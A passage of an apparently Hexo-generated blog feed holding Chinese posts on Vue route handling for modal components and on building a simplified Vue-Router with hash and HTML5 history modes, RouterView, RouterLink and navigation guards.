class="number">-1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>页面A -&gt; 组件B -&gt; 页面C，为了兼容页面C点击返回时，能显示组件B<br>页面A -&gt; 组件B -&gt; 组件C，同理在组件C推进路由<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 组件B</span></span><br><span class="line">mounted () &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.$route.query.modal &amp;&amp; <span class="keyword">this</span>.$route.query.modal == <span class="keyword">this</span>.$options.name) &#123;</span><br><span class="line">      <span class="comment">// 从另一个路由返回，路由带modal参数</span></span><br><span class="line">      <span class="keyword">this</span>.$router.replace(&#123; <span class="attr">path</span>: <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.$route.path&#125;</span>`</span> &#125;)</span><br><span class="line">      <span class="keyword">this</span>.$router.push(&#123; </span><br><span class="line">        path: <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.$route.path&#125;</span>`</span>,</span><br><span class="line">        query: &#123; <span class="attr">modal</span>: <span class="keyword">this</span>.$options.name &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure></p><p><br><br><em>这里存在两个问题</em></p><ol><li><p>页面A -&gt; 组件B -&gt; 组件C -&gt; 页面D<br>在页面D返回时候。 /#/A?model=C, 由于组件B 使用v-if来显示隐藏，此时组件B v-if=false，导致组件C没有挂载，C中的mounted方法无法执行</p><p>改成v-show? 用v-if可以减少很多空值的兼容</p></li><li><p>页面A -&gt; 组件B -&gt; 页面D<br>页面A -&gt; 组件C -&gt; 组件B -&gt; 页面D<br>上面的mounted方法里，定义了组件B在第二层。当其他地方调用的组件B在第三层，页面D返回时，显示组件B，再点击返回，就直接回到了页面A，组件C被跳过。这里限定了组件B只能在第二层。</p></li></ol><p><br></p><h3 id="2-刷新当前路由"><a href="#2-刷新当前路由" class="headerlink" title="2. 刷新当前路由"></a>2. 刷新当前路由</h3><p>路由刷新的中转文件，注册一个路由 /refresh -&gt; refresh.vue。调用 <em><code>this.$router.replace({ path: &#39;/refresh&#39; })</code></em> 来刷新当前路由。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- refresh.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span></span><br><span class="line"><span class="javascript">    next(<span class="function"><span class="params">vm</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> query = vm.$route.query || &#123;&#125;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> params = vm.$route.params || &#123;&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> &#123;</span></span><br><span class="line"><span class="undefined">        newRoute</span></span><br><span class="line"><span class="undefined">      &#125; = params</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 1. newRoute 使用新的路由对象刷新界面</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 2. 使用原来的路径和新的参数刷新界面</span></span></span><br><span class="line"><span class="undefined">      vm.$router.replace(newRoute || &#123;</span></span><br><span class="line"><span class="javascript">        path: <span class="keyword">from</span>.path,</span></span><br><span class="line"><span class="undefined">        query,</span></span><br><span class="line"><span class="undefined">        params</span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>实现一个 Vue-Router</title>
      <link href="/2019/10/25/vue-router/"/>
      <url>/2019/10/25/vue-router/</url>
      <content type="html"><![CDATA[<h3 id="1-实现原理"><a href="#1-实现原理" class="headerlink" title="1. 实现原理"></a>1. 实现原理</h3><p>hash 和 history都是实现前端路由的浏览器历史记录API。相对而言 history 比 hash 更为强大。</p><h4 id="1-1-Hash"><a href="#1-1-Hash" class="headerlink" title="1.1 Hash"></a>1.1 Hash</h4><table><thead><tr><th>属性 &amp; 方法</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td><code>window.location.hash = &#39;&#39;</code></td><td style="text-align:center">向历史记录中压入一个新记录，<code>window.location.hash</code>值发生变化后，会在浏览器添加一条新记录</td></tr><tr><td><code>window.location.replace()</code></td><td style="text-align:center">用给定的URL替换调当前的资源，被替换的页面不会被保存在会话的历史中。</td></tr><tr><td><code>window.hashchange事件</code></td><td style="text-align:center">在浏览器URL中hash发生变化后触发。URL中<em><code>#</code></em>后的内容就是hash，hash变化不会向服务器发起请求。</td></tr></tbody></table><p><br></p><h4 id="2-2-History"><a href="#2-2-History" class="headerlink" title="2.2 History"></a>2.2 History</h4><p>History API允许操作曾经在浏览器标签页访问的会话历史记录。</p><table><thead><tr><th>属性 &amp; 方法</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td><code>history.length</code></td><td style="text-align:center">当前历史记录栈的个数</td></tr><tr><td><code>history.back()</code></td><td style="text-align:center">前往上一页，点击浏览器返回按钮可模拟此方法，等价于<code>history.go(-1)</code></td></tr><tr><td><code>history.forward()</code></td><td style="text-align:center">前往下一页，点击浏览器前进按钮可模拟此方法，等价于<code>history.go(1)</code></td></tr><tr><td><code>history.go()</code></td><td style="text-align:center">通过当前页面的相对位置，跳转到某个历史记录页面</td></tr><tr><td><code>history.pushState(stateObject, title, url)</code></td><td style="text-align:center">向浏览器的历史堆栈压入一个新记录，并改变历史堆栈的当前指针至栈顶。stateObject: 用于存储该url对应的状态对象，该对象可在<code>onpopstate</code>事件中获取，也可在history对象中获取;title: 标题，目前浏览器未实现; url: 一般设置为相对路径，如果设置为绝对路径时需要保证同源。</td></tr><tr><td><code>history.replaceState()</code></td><td style="text-align:center">这个接口和<code>pushState</code>参数相同，区别在于<code>replaceState</code>是替换浏览器历史堆栈的当前历史记录。需要注意的是，<code>replaceState</code>不会改动浏览器历史堆栈的当前指针。</td></tr><tr><td><code>window.onpopstate事件</code></td><td style="text-align:center">历史堆栈的当前指针改变，则会触发onpopstate事件</td></tr></tbody></table><p>点击浏览器的前进、后退按钮，执行<em><code>history.forward</code></em>, <em><code>history.back</code></em>和<em><code>history.go</code></em>都会修改历史堆栈的当前指针。在不改变document的前提下，一旦当前指针改变则会触发<em><code>onpopstate</code></em>事件。</p><p>浏览器没有提供访问页面的历史记录栈的接口，但是它提供了<code>history.length</code>属性，它表明了当前历史记录栈的个数。它可以帮我们分析history API对历史记录栈的影响。</p><p>下图说明了：</p><ul><li>执行<em><code>window.history.go</code></em>, <em><code>history.back</code></em>, <em><code>history.forward</code></em>时，history栈大小不会改变，仅仅移动当前指针的位置</li><li>执行<em><code>pushState</code></em>时，会在当前指针上压入一个url入栈顶，同时修改当前指针</li></ul><p><img src="/2019/10/25/vue-router/1.png"></p><p><br></p><h3 id="2-实现功能"><a href="#2-实现功能" class="headerlink" title="2. 实现功能"></a>2. 实现功能</h3><p>Vue Router功能：</p><ul><li>Router构建选项<code>mode</code>: 支持HTML5 History, hash, abstract模式</li><li>Router构建选项<code>routes</code>: 支持传入<code>{ path: string, component: Component }</code></li><li>使用<code>&lt;router-link&gt;</code>来定义导航链接</li><li>使用<code>&lt;router-view&gt;</code>渲染路径匹配到的视图组件</li><li>使用<code>this.$router.push()</code>, <code>this.$router.replace</code>, <code>this.$router.go</code>实现路由跳转</li><li>使用<code>this.$route.params</code>, <code>this.$route.query</code>获取路径参数</li><li><p>实现Router的生命周期钩子（执行顺序）</p></li><li><p>动态路由匹配</p></li><li>嵌套路由</li><li>嵌套视图</li><li>导航守卫</li><li>过渡动效</li><li>路由懒加载</li></ul><p><br></p><h3 id="3-开始实现"><a href="#3-开始实现" class="headerlink" title="3. 开始实现"></a>3. 开始实现</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  mode: <span class="string">'history'</span>,</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">  router,</span><br><span class="line">&#125;).$mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure><h4 id="3-1-创建VueRouter实例"><a href="#3-1-创建VueRouter实例" class="headerlink" title="3.1 创建VueRouter实例"></a>3.1 创建VueRouter实例</h4><p>创建一个Vue Router实例，接收<code>mode</code>, <code>routes</code>参数</p><ul><li>为<code>this.$router</code>提供路由<code>push</code>, <code>replace</code>, <code>go</code>, <code>back</code>, <code>forward</code>方法</li><li>将传入的routes转成routerMap <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/index.js</span></span><br><span class="line"><span class="keyword">import</span> HashHistory <span class="keyword">from</span> <span class="string">'../history/hash'</span></span><br><span class="line"><span class="keyword">import</span> HTML5History <span class="keyword">from</span> <span class="string">'../history/html5'</span></span><br><span class="line"><span class="keyword">import</span> AbstractHistory <span class="keyword">from</span> <span class="string">'../history/abstract'</span></span><br><span class="line"><span class="keyword">import</span> &#123; createMatcher &#125; <span class="keyword">from</span> <span class="string">'./create-matcher'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">VueRouter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(options) &#123;</span><br><span class="line">    <span class="keyword">this</span>.app = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">this</span>.apps = []</span><br><span class="line">    <span class="keyword">this</span>.options = options</span><br><span class="line">    <span class="keyword">this</span>.mode = options.mode || <span class="string">'hash'</span></span><br><span class="line">    <span class="keyword">this</span>.fallback = options.mode === <span class="string">'history'</span></span><br><span class="line">    <span class="keyword">this</span>.history = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">this</span>.matcher = createMatcher(options.routes || [], <span class="keyword">this</span>) <span class="comment">// 路由匹配对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="keyword">this</span>.mode) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'history'</span>:</span><br><span class="line">        <span class="keyword">this</span>.history = <span class="keyword">new</span> HTML5History(<span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">'hash'</span>: </span><br><span class="line">        <span class="keyword">this</span>.history = <span class="keyword">new</span> HashHistory(<span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">'abstract'</span>:</span><br><span class="line">        <span class="keyword">this</span>.history = <span class="keyword">new</span> AbstractHistory(<span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`invalid mode: <span class="subst">$&#123;<span class="keyword">this</span>.mode&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  push(location) &#123;</span><br><span class="line">    <span class="keyword">this</span>.history.push(location)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  replace(location) &#123;</span><br><span class="line">    <span class="keyword">this</span>.history.replace(location)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  go(n) &#123;</span><br><span class="line">    <span class="keyword">this</span>.history.go(n)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  back() &#123;</span><br><span class="line">    <span class="keyword">this</span>.go(<span class="number">-1</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  forward() &#123;</span><br><span class="line">    <span class="keyword">this</span>.go(<span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-3-router-route"><a href="#3-3-router-route" class="headerlink" title="3.3 router, route"></a>3.3 router, route</h4><ul><li><code>Vue.use(Router)</code>时，会执行<code>install</code>方法并把Vue类传入，混入<code>beforeCreate</code>方法</li><li>将<code>$router</code>, <code>$route</code>放到<code>Vue.prototype</code>上，保证每个Vue实例都可以访问</li><li>定义全局组件<code>router-link</code>, <code>router-view</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// install.js</span></span><br><span class="line"><span class="keyword">import</span> View <span class="keyword">from</span> <span class="string">'../components/view'</span></span><br><span class="line"><span class="keyword">import</span> Link <span class="keyword">from</span> <span class="string">'../components/link'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">install</span>(<span class="params">Vue</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> isDef = <span class="function"><span class="params">v</span> =&gt;</span> v !== <span class="literal">undefined</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 应用里的每个Vue实例都会执行这个函数</span></span><br><span class="line">  Vue.mixin(&#123;</span><br><span class="line">    beforeCreate() &#123;</span><br><span class="line">      <span class="comment">// 判断是否是根组件，只有根组件上有router对象</span></span><br><span class="line">      <span class="keyword">if</span> (isDef(<span class="keyword">this</span>.$options.router)) &#123;</span><br><span class="line">        <span class="comment">// 根组件路由</span></span><br><span class="line">        <span class="keyword">this</span>._routerRoot = <span class="keyword">this</span></span><br><span class="line">        <span class="keyword">this</span>._router = <span class="keyword">this</span>.$options.router</span><br><span class="line">        <span class="keyword">this</span>._router.init(<span class="keyword">this</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为_route属性实现双向绑定，触发组件渲染</span></span><br><span class="line">        Vue.util.defineReactive(<span class="keyword">this</span>, <span class="string">'_route'</span>, <span class="keyword">this</span>._router.history.current)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 子组件路由</span></span><br><span class="line">        <span class="keyword">this</span>._routerRoot = (<span class="keyword">this</span>.$parent &amp;&amp; <span class="keyword">this</span>.$parent._routerRoot) || <span class="keyword">this</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置全局访问变量</span></span><br><span class="line">  <span class="comment">// _routerRoot 指向Vue实例</span></span><br><span class="line">  <span class="comment">// _router 指向VueRouter实例</span></span><br><span class="line">  <span class="comment">// $router 当前Router实例</span></span><br><span class="line">  <span class="comment">// $route 当前Route信息</span></span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$router'</span>, &#123;</span><br><span class="line">    get() &#123; <span class="keyword">return</span> <span class="keyword">this</span>._routerRoot._router &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(Vue.prototype, <span class="string">'$route'</span>, &#123;</span><br><span class="line">    get() &#123; <span class="keyword">return</span> <span class="keyword">this</span>._routerRoot._route &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 定义全局组件router-link, router-view</span></span><br><span class="line">  Vue.component(<span class="string">'RouterLink'</span>, Link)</span><br><span class="line">  Vue.component(<span class="string">'RouterView'</span>, View)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> strats = Vue.config.optionMergeStrategies</span><br><span class="line">  strats.beforeRouteEnter = strats.beforeRouteLeave = strats.beforeRouteUpdate = strats.created</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-4-HTML5-History模式"><a href="#3-4-HTML5-History模式" class="headerlink" title="3.4 HTML5 History模式"></a>3.4 HTML5 History模式</h4><p>还有hash模式、<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; START &#125; <span class="keyword">from</span> <span class="string">'../util/route'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">HTML5History</span></span>&#123;</span><br><span class="line"><span class="keyword">constructor</span>(router) &#123;</span><br><span class="line"><span class="keyword">this</span>.router = router</span><br><span class="line"><span class="keyword">this</span>.current = START</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'popstate'</span>, e =&gt; &#123;</span><br><span class="line"><span class="keyword">this</span>.transitionTo(<span class="keyword">this</span>.getCurrentLocation())</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改this.current值</span></span><br><span class="line">transitionTo (location) &#123;</span><br><span class="line"><span class="comment">// 修改current的值</span></span><br><span class="line"><span class="keyword">const</span> route = <span class="keyword">this</span>.router.match(location, <span class="keyword">this</span>.current)</span><br><span class="line"><span class="keyword">this</span>.current = route</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改所有app下的_route值，触发RouterView重新渲染</span></span><br><span class="line"><span class="keyword">this</span>.cb &amp;&amp; <span class="keyword">this</span>.cb(route)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getCurrentLocation() &#123;</span><br><span class="line"><span class="keyword">let</span> path = <span class="built_in">decodeURI</span>(<span class="built_in">window</span>.location.pathname)</span><br><span class="line"><span class="keyword">return</span> (path || <span class="string">'/'</span>) + <span class="built_in">window</span>.location.search + <span class="built_in">window</span>.location.hash</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">push(location) &#123;</span><br><span class="line"><span class="comment">// pushstate</span></span><br><span class="line"><span class="keyword">this</span>.transitionTo(location)</span><br><span class="line"><span class="built_in">window</span>.history.pushState(<span class="literal">null</span>, <span class="string">''</span>, location.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  replace(location) &#123;</span><br><span class="line"><span class="comment">// replacesstate</span></span><br><span class="line"><span class="keyword">this</span>.transitionTo(location)</span><br><span class="line"><span class="keyword">const</span> stateCopy = <span class="built_in">Object</span>.assign(&#123;&#125;, history.state)</span><br><span class="line"><span class="built_in">window</span>.history.replaceState(stateCopy, <span class="string">''</span>, location.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  go(n) &#123;</span><br><span class="line"><span class="built_in">window</span>.history.go(n)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="3-8-Router-View组件"><a href="#3-8-Router-View组件" class="headerlink" title="3.8 Router-View组件"></a>3.8 Router-View组件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'RouterView'</span>,</span><br><span class="line">  functional: <span class="literal">true</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      <span class="keyword">default</span>: <span class="string">'default'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  render(_, &#123; props, children, parent, data &#125;) &#123;</span><br><span class="line">    <span class="keyword">const</span> h = parent.$createElement</span><br><span class="line">    <span class="keyword">const</span> route = parent.$route</span><br><span class="line"></span><br><span class="line">    <span class="comment">// render empty node if no matched route or no config component</span></span><br><span class="line">    <span class="keyword">if</span> (!parent.$route) &#123;</span><br><span class="line">      <span class="keyword">return</span> h()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取路由对应组件</span></span><br><span class="line">    <span class="keyword">const</span> matched = route.matched[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">const</span> component = matched &amp;&amp; matched.components.default</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h(component, data, children)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-9-Router-Link组件"><a href="#3-9-Router-Link组件" class="headerlink" title="3.9 Router-Link组件"></a>3.9 Router-Link组件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'RouterLink'</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    to: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      required: <span class="literal">true</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  render(h) &#123;</span><br><span class="line">    <span class="keyword">const</span> router = <span class="keyword">this</span>.$router</span><br><span class="line">    <span class="keyword">const</span> current = <span class="keyword">this</span>.$route</span><br><span class="line">    <span class="keyword">const</span> &#123; location, route, href &#125; = router.resolve(<span class="keyword">this</span>.to, current)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> href = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      router.push(&#123; <span class="attr">path</span>: href &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;a on-click=&#123;href&#125;&gt;&#123;<span class="keyword">this</span>.$slots.default&#125;&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-钩子函数"><a href="#4-钩子函数" class="headerlink" title="4. 钩子函数"></a>4. 钩子函数</h3><h4 id="4-1-全局守卫"><a href="#4-1-全局守卫" class="headerlink" title="4.1 全局守卫"></a>4.1 全局守卫</h4><ul><li><code>router.beforeEach(to, from, next)</code>进入路由前</li><li><code>router.beforeResolve(to, from, next)</code></li><li><code>router.afterEach(to, from)</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123; ... &#125;)</span><br><span class="line"></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-2-路由独享守卫"><a href="#4-2-路由独享守卫" class="headerlink" title="4.2 路由独享守卫"></a>4.2 路由独享守卫</h4><ul><li><code>beforeRouteEnter</code>进入路由前</li><li><code>beforeRouteUpdate</code>路由复用同一个组件时</li><li><code>beforeRouteLeave</code>离开路由时<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">'/foo'</span>,</span><br><span class="line">      component: Foo,</span><br><span class="line">      beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">        <span class="comment">// 不能获取组件实例 `this`，组件实例还没被创建</span></span><br><span class="line">      